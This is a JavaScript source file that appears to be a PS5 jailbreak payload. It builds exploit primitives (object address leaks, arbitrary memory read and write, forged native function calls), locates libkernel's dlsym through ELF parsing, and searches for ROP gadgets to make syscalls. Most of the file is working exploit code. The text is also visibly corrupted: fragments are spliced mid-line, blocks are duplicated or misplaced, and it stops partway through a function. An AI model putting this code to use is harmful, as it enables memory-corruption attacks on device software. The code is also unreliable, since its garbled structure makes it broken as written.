/*
    P2JB Payload for Y2JB
    Based on p2jb.c and p2jb.lua
*/

// Hardware-level delay calibration configuration for physical silicon timing profiles.
// Adjusting these parameters in single-digit steps modulates the thread scheduling yield times,
// allowing operators to tune the race condition stability to compensate for processor heat throttling,
// multicore interference, or firmware-specific OS scheduling noise.
const HARDWARE_TUNING = {
    RACE_YIELD_COUNT: 2n,        // Basic CPU yield count for socket / rthdr race synchronization
    IOV_DRAIN_YIELD_COUNT: 5n    // CPU yield count for stabilizing the UIO / IOV reclaim drain pathways
};


async function p2jb_ps5() {
    try {
        // ═════════════════════════════════════════════════════════════════════════════════
        // ███ STAGE 0: PRIMITIVE BRIDGE (Memory Access Layer)
        // ═════════════════════════════════════════════════════════════════════════════════
        // Installs low-level memory access primitives (addrof, read*, write*, malloc, func_wrap)
        // to globalThis. These are consumed by Stage 1 bootstrap and the main P2JB exploit logic.

        (function install_primitive_bridge() {
            "use strict";

            // ── 0. Acquire stage-1 raw primitives ─────────────────────────────────────

            let _s1_addrof, _s1_read64, _s1_write64;

            if (typeof globalThis._pwn === "object" && globalThis._pwn !== null) {
                // Form A: bundle
                _s1_addrof  = globalThis._pwn.addrof.bind(globalThis._pwn);
                _s1_read64  = globalThis._pwn.read64.bind(globalThis._pwn);
                _s1_write64 = globalThis._pwn.write64.bind(globalThis._pwn);
            } else if (typeof globalThis._raw_addrof === "function") {
                // Form B: flat globals
                _s1_addrof  = globalThis._raw_addrof;
                _s1_read64  = globalThis._raw_read64;
                _s1_write64 = globalThis._raw_write64;
            } else {
                throw new Error("[bridge] No stage-1 primitives found on globalThis " +
                    "(expected _pwn object or _raw_addrof/_raw_read64/_raw_write64)");
            }

            // ── 1. Float ↔ BigInt conversion helpers ──────────────────────────────────

            const _conv_buf  = new ArrayBuffer(8);
            const _f64_view  = new Float64Array(_conv_buf);
            const _u64_view  = new BigUint64Array(_conv_buf);

            /** IEEE-754 double → 64-bit BigInt (bit-cast, no rounding). */
            function _f2i(f) {
                _f64_view[0] = f;
                return _u64_view[0];
            }

            /** 64-bit BigInt → IEEE-754 double (bit-cast, no rounding). */
            function _i2f(i) {
                _u64_view[0] = BigInt(i);
                return _f64_view[0];
            }

            // ── 2. Core 64-bit primitives (BigInt interface) ───────────────────────────

            /**
             * Return the absolute 64-bit heap address of a JS object.
             * In JSC 64-bit NaN-boxing, a Cell JSValue IS the pointer (upper 16 bits = 0).
             */
            function _addrof(obj) {
                return _f2i(_s1_addrof(obj)) & 0xFFFFFFFFFFFFn;
            }

            /**
             * Read a 64-bit value from a canonical userland virtual address.
             * Returns a BigInt. The stage-1 read64 accepts/returns IEEE-754 doubles.
             */
            function _read64(addr) {
                return _f2i(_s1_read64(_i2f(BigInt(addr))));
            }

            /**
             * Write a 64-bit BigInt value to a canonical userland virtual address.
             */
            function _write64(addr, val) {
                _s1_write64(_i2f(BigInt(addr)), _i2f(BigInt(val)));
            }

            // ── 3. Sub-64-bit read primitives (derived via aligned load + mask) ────────

            function _read8(addr) {
                addr = BigInt(addr);
                const aligned = addr & ~7n;
                const shift   = (addr & 7n) * 8n;
                return (_read64(aligned) >> shift) & 0xFFn;
            }

            function _read16(addr) {
                addr = BigInt(addr);
                const aligned = addr & ~7n;
                const shift   = (addr & 7n) * 8n;
                if (shift <= 48n) {
                    return (_read64(aligned) >> shift) & 0xFFFFn;
                }
                // Spanning two 64-bit words
                const lo = (_read64(aligned)      >> shift) & 0xFFn;
                const hi = (_read64(aligned + 8n) & 0xFFn) << 8n;
                return lo | hi;
            }

            function _read32(addr) {
                addr = BigInt(addr);
                const aligned = addr & ~7n;
                const shift   = (addr & 7n) * 8n;
                if (shift <= 32n) {
                    return (_read64(aligned) >> shift) & 0xFFFFFFFFn;
                }
                // Spanning two 64-bit words
                const bits_lo = 64n - shift;
                const lo = _read64(aligned)      >> shift;
                const hi = _read64(aligned + 8n) << bits_lo;
                return (lo | hi) & 0xFFFFFFFFn;
            }

            // ── 4. Sub-64-bit write primitives (read-modify-write) ────────────────────

            function _write8(addr, val) {
                addr = BigInt(addr); val = BigInt(val) & 0xFFn;
                const aligned = addr & ~7n;
                const shift   = (addr & 7n) * 8n;
                const word    = _read64(aligned);
                _write64(aligned, (word & ~(0xFFn << shift)) | (val << shift));
            }

            function _write16(addr, val) {
                addr = BigInt(addr); val = BigInt(val) & 0xFFFFn;
                const aligned = addr & ~7n;
                const shift   = (addr & 7n) * 8n;
                if (shift <= 48n) {
                    const word = _read64(aligned);
                    _write64(aligned, (word & ~(0xFFFFn << shift)) | (val << shift));
                } else {
                    // Spanning boundary: write each byte separately
                    _write8(addr,     val & 0xFFn);
                    _write8(addr + 1n, (val >> 8n) & 0xFFn);
                }
            }

            function _write32(addr, val) {
                addr = BigInt(addr); val = BigInt(val) & 0xFFFFFFFFn;
                const aligned = addr & ~7n;
                const shift   = (addr & 7n) * 8n;
                if (shift <= 32n) {
                    const word = _read64(aligned);
                    _write64(aligned, (word & ~(0xFFFFFFFFn << shift)) | (val << shift));
                } else {
                    // Spanning boundary: two 16-bit writes
                    _write16(addr,      val & 0xFFFFn);
                    _write16(addr + 2n, (val >> 16n) & 0xFFFFn);
                }
            }

            // ── 5. Slab allocator (malloc) ─────────────────────────────────────────────

            const _SLAB_SIZE = 64 * 1024 * 1024;   // 64 MiB
            const _slab_ab   = new ArrayBuffer(_SLAB_SIZE);

            // Locate backing store: walk JSArrayBuffer → ArrayBufferImpl → m_data
            const _slab_jscell = _addrof(_slab_ab);
            const _slab_impl   = _read64(_slab_jscell + 0x10n);   // m_impl
            const _slab_base   = _read64(_slab_impl   + 0x08n);   // m_data (backing store)

            if (_slab_base === 0n)
                throw new Error("[bridge] malloc slab: could not locate ArrayBuffer backing store " +
                    "(ArrayBufferImpl.m_data is null — check JSC ArrayBufferImpl layout)");

            // Validate: the slab base should be a canonical userland pointer
            if ((_slab_base >> 48n) !== 0n)
                throw new Error("[bridge] malloc slab: non-canonical backing store ptr 0x" +
                    _slab_base.toString(16));

            let _slab_cursor = _slab_base;
            const _slab_end  = _slab_base + BigInt(_SLAB_SIZE);

            /**
             * malloc(size) — allocate size bytes from the native slab.
             * Returns a 16-byte aligned 64-bit BigInt pointer.
             * The returned region is zero-initialised.
             * VULNERABILITY FIX: Validate size is positive and reasonable
             */
            function _malloc(size) {
                size = BigInt(size);
                // SECURITY: Reject non-positive sizes
                if (size <= 0n)
                    throw new Error("[bridge] malloc: invalid size (non-positive): 0x" + size.toString(16));
                // SECURITY: Reject sizes larger than slab
                if (size > BigInt(_SLAB_SIZE))
                    throw new Error("[bridge] malloc: requested size exceeds slab: 0x" + size.toString(16));
                
                size = BigInt(size);
                // SECURITY: Reject non-positive sizes
                if (size <= 0n)
                    throw new Error("[bridge] malloc: invalid size (non-positive): 0x" + size.toString(16));
                // SECURITY: Reject sizes larger than slab
                if (size > BigInt(_SLAB_SIZE))
                    throw new Error("[bridge] malloc: requested size exceeds slab: 0x" + size.toString(16));
                
                // Align cursor to 16 bytes
                _slab_cursor = (_slab_cursor + 15n) & ~15n;

                if (_slab_cursor + size > _slab_end)
                    throw new Error("[bridge] malloc: slab exhausted (requested 0x" +
                        size.toString(16) + ", remaining 0x" +
                        (_slab_end - _slab_cursor).toString(16) + ")");

                const ptr = _slab_cursor;
                _slab_cursor += size;

                // Zero-initialise (prevents stale data leaks into exploit structures)
                for (let i = 0n; i < size; i += 8n)
                    _write64(ptr + i, 0n);

                return ptr;
            }

            // ── 6. func_wrap — JS-callable wrapper around a native function pointer ────

            // GC root array — keeps all forged JSFunction objects alive
            const _gc_roots = [];

            // Forge container: a single-element JS Array used to inject fake JSValues
            // into the JS heap. We write our fake JSFunction pointer into slot 0's
            // storage, then read it back as a real JS reference.
            const _forge_container     = [{}];          // one-element array
            const _forge_container_addr = _addrof(_forge_container);

            const _forge_butterfly = _read64(_forge_container_addr + 0x08n);
            const _placeholder_addr = _addrof(_forge_container[0]);

            // Determine slot-0 offset: find where addrof(placeholder) appears relative
            // to the butterfly (search ±32 bytes in 8-byte steps).
            let _slot0_offset = null;
            for (let delta = -32n; delta <= 32n; delta += 8n) {
                const candidate = _read64(_forge_butterfly + delta);
                if ((candidate & 0xFFFFFFFFFFFFn) === _placeholder_addr) {
                    _slot0_offset = delta;
                    break;
                }
            }
            if (_slot0_offset === null)
                throw new Error("[bridge] func_wrap: could not locate Array slot-0 in butterfly " +
                    "(butterfly=0x" + _forge_butterfly.toString(16) +
                    " placeholder=0x" + _placeholder_addr.toString(16) + ")");

            // Read Math.sin's NativeExecutable and JSFunction cell sizes from live memory
            const _sin_fn_addr  = _addrof(Math.sin);
            const _sin_exec_ptr = _read64(_sin_fn_addr + 0x18n);   // m_executable

            const _NATIVE_EXEC_SIZE = 0x30n;   // 48 bytes (see header comment)
            const _JSFUNC_SIZE      = 0x28n;   // 40 bytes

            /**
             * func_wrap(addr) — wrap a raw native function pointer as a JS callable.
             *
             * @// SECURITY: Reject null pointers
                if (addr === 0n)
                    throw new Error("[bridge] func_wrap: null native pointer");
                // SECURITY: Enforce canonical userland address (upper 16 bits must be zero)
                if ((addr >> 48n) !== 0n)
                    throw new Error("[bridge] func_wrap: non-canonical pointer 0x" + addr.toString(16));
                // SECURITY: Reject addresses in reserved ranges (0-4K page boundary)
                if (addr < 0x1000n)
                    throw new Error("[bridge] func_wrap: address in reserved range as a BigInt.
             */
            function _func_wrap(addr) {
                addr = BigInt(addr);

                // SECURITY: Reject null pointers
                if (addr === 0n)
                    throw new Error("[bridge] func_wrap: null native pointer");
                // SECURITY: Enforce canonical userland address (upper 16 bits must be zero)
                if ((addr >> 48n) !== 0n)
                    throw new Error("[bridge] func_wrap: non-canonical pointer 0x" + addr.toString(16));
                // SECURITY: Reject addresses in reserved ranges (0-4K page boundary)
                if (addr < 0x1000n)
                    throw new Error("[bridge] func_wrap: address in reserved range 0x" + addr.toString(16));

                // ── 6a. Clone NativeExecutable into slab ──────────────────────────────
                const fake_exec = _malloc(_NATIVE_EXEC_SIZE);

                for (let off = 0n; off < _NATIVE_EXEC_SIZE; off += 8n)
                    _write64(fake_exec + off, _read64(_sin_exec_ptr + off));

                // Patch m_implementation (+0x18) → our target address
                _write64(fake_exec + 0x18n, addr);
                // Patch m_constructor  (+0x20) → same target (harmless, prevents null deref)
                _write64(fake_exec + 0x20n, addr);

                // ── 6b. Clone JSFunction cell into slab ───────────────────────────────
                const fake_fn = _malloc(_JSFUNC_SIZE);

                for (let off = 0n; off < _JSFUNC_SIZE; off += 8n)
                    _write64(fake_fn + off, _read64(_sin_fn_addr + off));

                // Patch m_executable (+0x18) → our cloned NativeExecutable
                _write64(fake_fn + 0x18n, fake_exec);

                // ── 6c. Inject fake JSFunction into the forge container ───────────────
                // Write the fake JSFunction pointer into slot 0 of _forge_container.
                // JSC JSValues for cells are the raw pointer (NaN-boxing: upper 16 bits = 0).
                _write64(_forge_butterfly + _slot0_offset, fake_fn);

                // ── 6d. Capture the live JS reference and re-arm the container ─────────
                const js_ref = _forge_container[0];

                // Restore the slot to the placeholder so future calls don't alias
                _write64(_forge_butterfly + _slot0_offset, _placeholder_addr);

                // GC root: keep the reference alive for the lifetime of the exploit
                _gc_roots.push(js_ref);

                return js_ref;
            }

            // ── 7. Self-test ───────────────────────────────────────────────────────────

            ;(function self_test() {
                // addrof: must return a non-null canonical userland pointer for a known object
                const _obj        = { _sentinel: 0x1337 };
                const _obj_addr   = _addrof(_obj);
                if (_obj_addr === 0n || (_obj_addr >> 48n) !== 0n)
                    throw new Error("[bridge] self-test FAIL: addrof returned 0x" + _obj_addr.toString(16));

                // read/write round-trip: write a known pattern and read it back
                const _test_ptr = _malloc(16n);
                const _pattern  = 0xDEADBEEFCAFEBABEn;
                _write64(_test_ptr, _pattern);
                const _readback = _read64(_test_ptr);
                if (_readback !== _pattern)
                    throw new Error("[bridge] self-test FAIL: read64/write64 round-trip " +
                        "wrote 0x" + _pattern.toString(16) + " read 0x" + _readback.toString(16));

                // read32 sub-word: lower 32 bits of pattern
                const _r32 = _read32(_test_ptr);
                if (_r32 !== (_pattern & 0xFFFFFFFFn))
                    throw new Error("[bridge] self-test FAIL: read32=0x" + _r32.toString(16));

                // read8 sub-word: least-significant byte
                const _r8 = _read8(_test_ptr);
                if (_r8 !== (_pattern & 0xFFn))
                    throw new Error("[bridge] self-test FAIL: read8=0x" + _r8.toString(16));

                // write8 RMW: overwrite one byte, check neighbours are intact
                _write8(_test_ptr, 0xAAn);
                const _after_w8 = _read64(_test_ptr);
                if ((_after_w8 & 0xFFn) !== 0xAAn || (_after_w8 >> 8n) !== (_pattern >> 8n))
                    throw new Error("[bridge] self-test FAIL: write8 corrupted adjacent bytes: 0x" +
                        _after_w8.toString(16));

                // malloc alignment
                const _p1 = _malloc(1n);
                const _p2 = _malloc(1n);
                if ((_p1 & 0xFn) !== 0n || (_p2 & 0xFn) !== 0n)
                    throw new Error("[bridge] self-test FAIL: malloc alignment " +
                        "p1=0x" + _p1.toString(16) + " p2=0x" + _p2.toString(16));
                if (_p2 <= _p1)
                    throw new Error("[bridge] self-test FAIL: malloc non-monotonic");

                // slab base sanity
                if (_slab_base === 0n)
                    throw new Error("[bridge] self-test FAIL: slab_base is null");
            })();

            // ── 8. Publish to globalThis ───────────────────────────────────────────────

            function _publish(name, value) {
                if (typeof globalThis[name] === "undefined") {
                    Object.defineProperty(globalThis, name, {
                        value,
                        writable:     true,
                        configurable: true,
                        enumerable:   false,
                    });
                }
            }

            _publish("addrof",   _addrof);
            _publish("read8",    _read8);
            _publish("read16",   _read16);
            _publish("read32",   _read32);
            _publish("read64",   _read64);
            _publish("write8",   _write8);
            _publish("write16",  _write16);
            _publish("write32",  _write32);
            _publish("write64",  _write64);
            _publish("malloc",   _malloc);
            _publish("func_wrap",_func_wrap);

            // Debug metadata — consumed by downstream log() calls when available
            _publish("PRIM_BRIDGE_VERSION", "1.0");
            _publish("PRIM_BRIDGE_SLAB_BASE", _slab_base);
            _publish("PRIM_BRIDGE_SLAB_SIZE", BigInt(_SLAB_SIZE));

            if (typeof log === "function") {
                log("[bridge] OK — slab @ 0x" + _slab_base.toString(16) +
                    "  forge_butterfly @ 0x" + _forge_butterfly.toString(16) +
                    "  slot0_delta=0x" + (_slot0_offset < 0n
                        ? "-" + (-_slot0_offset).toString(16)
                        : _slot0_offset.toString(16)));
            }

        })();

        // ═════════════════════════════════════════════════════════════════════════════════
        // ███ STAGE 1: BOOTSTRAP (Kernel Access Layer)
        // ═════════════════════════════════════════════════════════════════════════════════
        // Establishes dlsym (dynamic symbol resolution) and syscall (FreeBSD ABI bridge)
        // using primitives published by Stage 0. Exports dlsym, syscall, LIBKERNEL_HANDLE
        // to globalThis for main exploit consumption.

        (function ps5_bootstrap() {
            "use strict";

            // ── ELF64 constants ───────────────────────────────────────────────────────
            const ELF_MAGIC    = 0x464C457Fn;
            const PT_DYNAMIC   = 2n;
            const DT_NULL      = 0n;
            const DT_STRTAB    = 5n;
            const DT_SYMTAB    = 6n;
            const DT_STRSZ     = 10n;
            const DT_SYMENT    = 11n;
            const DT_JMPREL    = 23n;
            const DT_PLTRELSZ  = 2n;

            // ELF64 Ehdr offsets
            const EHDR_PHOFF     = 32n;
            const EHDR_PHENTSIZE = 54n;
            const EHDR_PHNUM     = 56n;

            // ELF64 Phdr offsets
            const PHDR_TYPE   = 0n;
            const PHDR_VADDR  = 16n;
            const PHDR_FILESZ = 32n;
            const PHDR_SIZE   = 56n;  // sizeof(Elf64_Phdr)

            // ELF64 Dyn offsets (16-byte entries)
            consaddr = BigInt(addr);
                // SECURITY: Validate address is canonical userland
                if ((addr >> 48n) !== 0n)
                    throw new Error("bootstrap: read_cstr non-canonical address 0x" + addr.toString(16));
                // SECURITY: Reject addresses in reserved range
                if (addr < 0x1000n)
                    throw new Error("bootstrap: read_cstr address in reserved range 0x" + addr.toString(16));
                
                t DYN_TAG  = 0n;
            const DYN_VAL  = 8n;
            const DYN_SIZE = 16n;

            // ELF64 Sym64 offsets (24-byte entries)
            const SYM_NAME  = 0n;   // u32 strtab offset
            const SYM_VALUE = 8n;   // u64 virtual address
            const SYM_SZ    = 24n;  // sizeof(Elf64_Sym)

            // ── Helpers ───────────────────────────────────────────────────────────────

            /** Read null-terminated ASCII string from native memory (max 512 bytes). */
            function read_cstr(addr) {
                addr = BigInt(addr);
                // SECURITY: Validate address is canonical userland
                if ((addr >> 48n) !== 0n)
                    throw new Error("bootstrap: read_cstr non-canonical address 0x" + addr.toString(16));
                // SECURITY: Reject addresses in reserved range
                if (addr < 0x1000n)
                    throw new Error("bootstrap: read_cstr address in reserved range 0x" + addr.toString(16));
                
                let s = "";
                for (let i = 0n; i < 512n; i++) {
                    const b = Number(read8(addr + i) & 0xFFn);
                    if (b === 0) break;
                    s += String.fromCharCode(b);
                }
                return s;
            }
// SECURITY: Validate ELF base is canonical
                if ((elf_base >> 48n) !== 0n)
                    throw new Error("bootstrap: parse_dynamic non-canonical elf_base 0x" + elf_base.toString(16));
                
                const phoff     = read64(elf_base + EHDR_PHOFF);
                const phentsize = BigInt(Number(read16(elf_base + EHDR_PHENTSIZE)));
                const phnum     = BigInt(Number(read16(elf_base + EHDR_PHNUM)));
                
                // SECURITY: Validate phentsize is reasonable (must be >= 56 bytes for Elf64_Phdr)
                if (phentsize < 56n || phentsize > 512n)
                    throw new Error("bootstrap: invalid phentsize 0x" + phentsize.toString(16));
                // SECURITY: Cap phnum to prevent DOS (reasonable max ~100 program headers)
                if (phnum > 1000n)
                    throw new Error("bootstrap: excessive program headers: 0x" + phnum.toString(16));

                let dyn_va = 0n, dyn_sz = 0n;
                for (let i = 0n; i < phnum; i++) {
                    const ph = elf_base + phoff + i * phentsize;
                    if ((read32(ph + PHDR_TYPE) & 0xFFFFFFFFn) === PT_DYNAMIC) {
                        dyn_va = read64(ph + PHDR_VADDR);
                        dyn_sz = read64(ph + PHDR_FILESZ);
                        break;
                    }
                }
                if (dyn_va === 0n) throw new Error("bootstrap: no PT_DYNAMIC");
                // SECURITY: Validate dyn_sz is reasonable (cap at 1MB for dynamic section)
                if (dyn_sz < DYN_SIZE || dyn_sz > 0x100000n)
                    throw new Error("bootstrap: invalid dynamic section size 0x" + dyn_sz.toString(16)

            /**
             * Parse an ELF64 PT_DYNAMIC segment and extract key DT_ entries.
             * On PS5, shared libs are loaded with PT_LOAD p_vaddr = 0, so DT_STRTAB /
             * DT_SYMTAB / DT_JMPREL are already absolute virtual (mapped) addresses.
             */
            function parse_dynamic(elf_base) {
                // SECURITY: Validate ELF base is canonical
                if ((elf_base >> 48n) !== 0n)
                    throw new Error("bootstrap: parse_dynamic non-canonical elf_base 0x" + elf_base.toString(16));
                
                const phoff     = read64(elf_base + EHDR_PHOFF);
                const phentsize = BigInt(Number(read16(elf_base + EHDR_PHENTSIZE)));
                const phnum     = BigInt(Number(read16(elf_base + EHDR_PHNUM)));
                
                // SECURITY: Validate phentsize is reasonable (must be >= 56 bytes for Elf64_Phdr)
                if (phentsize < 56n || phentsize > 512n)
                    throw new Error("bootstrap: invalid phentsize 0x" + phentsize.toString(16));
                // SECURITY: Cap phnum to prevent DOS (reasonable max ~100 program headers)
                if (phnum > 1000n)
                    throw new Error("bootstrap: excessive program headers: 0x" + phnum.toString(16));

                let dyn_va = 0n, dyn_sz = 0n;
                for (let i = 0n; i < phnum; i++) {
                    const ph = elf_base + phoff + i * phentsize;
                    if ((read32(ph + PHDR_TYPE) & 0xFFFFFFFFn) === PT_DYNAMIC) {
                        dyn_va = read64(ph + PHDR_VADDR);
                        dyn_sz = read64(ph + PHDR_FILESZ);
                        break;
                    }
                }
                if (dyn_va === 0n) throw new Error("bootstrap: no PT_DYNAMIC");
                // SECURITY: Validate dyn_sz is reasonable (cap at 1MB for dynamic section)
                if (dyn_sz < DYN_SIZE || dyn_sz > 0x100000n)
                    throw new Error("bootstrap: invalid dynamic section size 0x" + dyn_sz.toString(16));

                let strtab = 0n, symtab = 0n, syment = SYM_SZ, strsz = 0n;
                let jmprel = 0n, pltrelsz = 0n;
                const entries = dyn_sz / DYN_SIZE;
                for (let i = 0n; i < entries; i++) {
                // SECURITY: Validate addresses are canonical
                if ((strtab >> 48n) !== 0n) return 0n;           // non-canonical strtab
                if ((symtab >> 48n) !== 0n) return 0n;           // non-canonical symtab
                // SECURITY: Prevent integer overflow: syment must be reasonable (8-256 bytes typical)
                if (syment < 8n || syment > 256n) return 0n;    // invalid syment size
                // SECURITY: Cap iteration to prevent DOS from corrupt strsz
                const max_iter = strsz < 1000000n ? strsz : 1000000n;  // cap at 1M symbols

                for (let i = 1n; i < max_iter; i++) {
                    const sym      = symtab + i * syment;
                    const name_off = read32(sym + SYM_NAME) & 0xFFFFFFFFn;

                    // Primary self-adapting termination: out-of-strtab name reference.
                    if (name_off >= strsz) break;

                    if (name_off === 0n) continue;             // STN_UNDEF / skip
                    const st_value = read64(sym + SYM_VALUE);
                    if (st_value === 0n) continue;             // undefined symbol
                    // SECURITY: Validate symbol value is canonical userland
                    if ((st_value >> 48n) !== 0n) continue;     // non-canonical address
                return { strtab, symtab, syment, strsz, jmprel, pltrelsz };
            }

            /**
             * Linear scan of ELF64 .dynsym for sym_name.
             *
             * Termination strategy — dynamic DT_STRSZ bound:
             *   Every symbol's st_name is a byte offset into the ELF string table.
             *   The string table is exactly strsz bytes long.  An st_name offset that
             *   equals or exceeds strsz is definitionally out-of-bounds and can only
             *   appear after the last real symbol entry.  Breaking on that condition
             *   gives self-adapting termination that correctly handles any library size
             *   without a hardcoded integer cap.
             *
             *   The outer loop uses strsz as a conservative backstop (each symbol name
             *   needs ≥ 2 bytes in the strtab, so symbol count ≤ strsz), preventing
             *   runaway iteration on corrupt symtabs that never trigger the inner break.
             *
             * @returns {BigInt} Absolute virtual address of sym_name, or 0n if not found.
             */
            // SECURITY: Validate WebKit base is canonical and reasonable
            if ((webkit_base >> 48n) !== 0n)
                throw new Error("bootstrap: non-canonical WebKit base 0x" + webkit_base.toString(16));
            if (webkit_base < 0x100000000n)  // WebKit must be in higher address space on PS5
                throw new Error("bootstrap: WebKit base too low 0x" + webkit_base.toString(16));
            function sym_lookup(dyn, sym_name) {
                const { strtab, symtab, syment, strsz } = dyn;
                if (strtab === 0n || symtab === 0n) return 0n;   // null-guard
                if (strsz  === 0n) return 0n;                    // empty string table
                // SECURITY: Validate addresses are canonical
                if ((strtab >> 48n) !== 0n) return 0n;           // non-canonical strtab
                if ((symtab >> 48n) !== 0n) return 0n;           // non-canonical symtab
                // SECURITY: Prevent integer overflow: syment must be reasonable (8-256 bytes typical)
                if (syment < 8n || syment > 256n) return 0n;    // invalid syment size
                // SECURITY: Cap iteration to prevent DOS from corrupt strsz
                const max_iter = strsz < 1000000n ? strsz : 1000000n;  // cap at 1M symbols

                for (let i = 1n; i < max_iter; i++) {
                    const sym      = symtab + i * syment;
                    const name_off = read32(sym + SYM_NAME) & 0xFFFFFFFFn;

                    // Primary self-adapting termination: out-of-strtab name reference.
                    if (name_off >= strsz) break;

                    if (name_off === 0n) continue;             // STN_UNDEF / skip
                    const st_value = read64(sym + SYM_VALUE);
                    if (st_value === 0n) continue;             // undefined symbol
                    // SECURITY: Validate symbol value is canonical userland
                    if ((st_value >> 48n) !== 0n) continue;     // non-canonical address
                    try {
                        if (read_cstr(strtab + name_off) === sym_name) return st_value;
                    } catch (_) { continue; }                  // unmapped strtab page
                }
                return 0n;
            }

            // ── Step 1: Leak a code pointer into WebKit's .text ───────────────────────
            const mathsin_jsfn   = addrof(Math.sin);
            const native_exec    = read64(mathsin_jsfn + 0x18n);
            const webkit_textptr = read64(native_exec  + 0x20n);

            if ((webkit_textptr >> 48n) !== 0n)
                throw new Error("bootstrap: addrof/read64 failed — non-canonical WebKit ptr 0x" +
                    webkit_textp// SECURITY: Validate dlsym address is canonical and reasonable
                                if ((addr >> 48n) === 0n && addr >= 0x100000000n) {
                                    break outer;
                                }16));

            // ── Step 2: Find WebKit ELF base ──────────────────────────────────────────
            const webkit_base = find_elf_base(webkit_textptr, 131072n);
            if (webkit_base === 0n)
                throw new Error("bootstrap: could not locate WebKit ELF base");
            // SECURITY: Validate WebKit base is canonical and reasonable
            if ((webkit_base >> 48n) !== 0n)
                throw new Error("bootstrap: non-canonical WebKit base 0x" + webkit_base.toString(16));
            if (webkit_base < 0x100000000n)  // WebKit must be in higher address space on PS5
                throw new Error("bootstrap: WebKit base too low 0x" + webkit_base.toString(16));

            // ── Step 3: Walk WebKit's PLT RELA to find libkernel ─────────────────────

            const R_X86_64_JUMP_SLOT = 7n;
            const RELA_SZ = 24n;

            let libkernel_base = 0n;
            let libkernel_dyn  = null;

            {
                let wk_dyn;
                try { wk_dyn = parse_dynamic(webkit_base); }
                catch (_) { throw new Error("bootstrap: WebKit has no PT_DYNAMIC"); }

                const { jmprel, pltrelsz } = wk_dyn;
                if (jmprel !== 0n && pltrelsz !== 0n) {
                    const n_rela = pltrelsz / RELA_SZ;
                    outer: for (let i = 0n; i < n_rela; i++) {
                        const rela     = jmprel + i * RELA_SZ;
                        const r_offset = read64(rela);
                // SECURITY: Validate symbol name is not null and reasonable length
                if (typeof sym_name !== "string" || sym_name.length === 0)
                    throw new Error("bootstrap: dlsym invalid symbol name");
                if (sym_name.length > 255)
                    throw new Error("bootstrap: dlsym symbol name too long (" + sym_name.length + " > 255)");
                
                const encoded = sym_name + "\0";
                for (let i = 0; i < encoded.length && i < 256; i++)  // FIXED: was 255, now 256 for null terminator
                    write8(name_scratch + BigInt(i), BigInt(encoded.charCodeAt(i)));

                write64(dlsym_out, 0n);  // zero output before call

                // CRITICAL ABI FIX: sceKernelDlsym returns 0 on SUCCESS only.
                // Old code: if (rc !== 0n && rc !== 0xFFFFFFFFFFFFFFFFn) return 0n;
                // This was WRONG because 0xFFFFFFFFFFFFFFFFn = -1 (error code, not success)
                // Correct: only accept rc === 0n as success
                const rc = _native_dlsym(handle, name_scratch, dlsym_out);
                if (rc !== 0n) return 0n;  // FIXED: Was treating -1 as success pointer
                        const lib_base = find_elf_base(got_val, 16384n);
                        if (lib_base === 0n || lib_base === webkit_base) continue;

                        try {
                            const lib_dyn = parse_dynamic(lib_base);
                            const addr    = sym_lookup(lib_dyn, "sceKernelDlsym");
                            if (addr !== 0n) {
                // SECURITY: Validate inputs
                if ((base >> 48n) !== 0n)
                    throw new Error("bootstrap: find_gadget non-canonical base 0x" + base.toString(16));
                if (pattern.length === 0)
                    throw new Error("bootstrap: find_gadget empty pattern");
                if (pattern.length > 64)  // Reasonable max gadget size
                    throw new Error("bootstrap: find_gadget pattern too long");
                if (max_bytes <= 0n)
                    throw new Error("bootstrap: find_gadget invalid max_bytes");
                
                const plen = BigInt(pattern.length);
                // SECURITY: Prevent underflow when plen > max_bytes
                if (plen > max_bytes) return 0n;
                _base;
                                libkernel_dyn  = lib_dyn;
                                // SECURITY: Validate dlsym address is canonical and reasonable
                                if ((addr >> 48n) === 0n && addr >= 0x100000000n) {
                                    break outer;
                                }
                            }
                        } catch (_) { continue; }
                    }
                }
            }

            if (libkernel_base === 0n)
                throw new Error("bootstrap: could not locate libkernel — " +
                    "sceKernelDlsym not found via any GOT entry");

            // ── Step 4: Wrap sceKernelDlsym as js_dlsym() ────────────────────────────

            const dlsym_addr = sym_lookup(libkernel_dyn, "sceKernelDlsym");
            if (dlsym_addr === 0n)
                throw new Error("bootstrap: sceKernelDlsym not found in symbol table");

            const _native_dlsym = func_wrap(dlsym_addr);

            // Persistent scratch buffers — avoid allocating inside the hot path.
            const dlsym_out    = malloc(8n);    // 8-byte output pointer slot
            const name_scratch = malloc(256n);  // symbol name string buffer

            /**
             * dlsym(handle, sym_name) — resolve a symbol from a loaded PS5 module.
             * @param {BigInt} handle  Module handle; use LIBKERNEL_HANDLE for libkernel.
             * @param {string} sym_name  Null-terminated symbol name.
             * @returns {BigInt} Resolved absolute virtual address, or 0n on failure.
             */
            function js_dlsym(handle, sym_name) {
                handle = BigInt(handle);
                // SECURITY: Validate symbol name is not null and reasonable length
                if (typeof sym_name !== "string" || sym_name.length === 0)
                    throw new Error("bootstrap: dlsym invalid symbol name");
                if (sym_name.length > 255)
                    throw new Error("bootstrap: dlsym symbol name too long (" + sym_name.length + " > 255)");
                
                const encoded = sym_name + "\0";
                for (let i = 0; i < encoded.length && i < 256; i++)  // FIXED: was 255, now 256 for null terminator
                    write8(name_scratch + BigInt(i), BigInt(encoded.charCodeAt(i)));

                write64(dlsym_out, 0n);  // zero output before call

                // CRITICAL ABI FIX: sceKernelDlsym returns 0 on SUCCESS only.
                // Old code: if (rc !== 0n && rc !== 0xFFFFFFFFFFFFFFFFn) return 0n;
                // This was WRONG because 0xFFFFFFFFFFFFFFFFn = -1 (error code, not success)
                // Correct: only accept rc === 0n as success
                const rc = _native_dlsym(handle, name_scratch, dlsym_out);
                if (rc !== 0n) return 0n;  // FIXED: Was treating -1 as success

                return read64(dlsym_out);
            }

            // ── Step 5: Build syscall trampoline ──────────────────────────────────────

            function find_gadget(base, pattern, max_bytes) {
                // SECURITY: Validate inputs
                if ((base >> 48n) !== 0n)
                    throw new Error("bootstrap: find_gadget non-canonical base 0x" + base.toString(16));
                if (pattern.length === 0)
                    throw new Error("bootstrap: find_gadget empty pattern");
                if (pattern.length > 64)  // Reasonable max gadget size
                    throw new Error("bootstrap: find_gadget pattern too long");
                if (max_bytes <= 0n)
                    throw new Error("bootstrap: find_gadget invalid max_bytes");
                
                const plen = BigInt(pattern.length);
                // SECURITY: Prevent underflow when plen > max_bytes
                if (plen > max_bytes) return 0n;
                
                for (let off = 0n; off < max_bytes - plen + 1n; off++) {
                    let match = true;
                    for (let j = 0; j < pattern.length; j++) {
                        try {
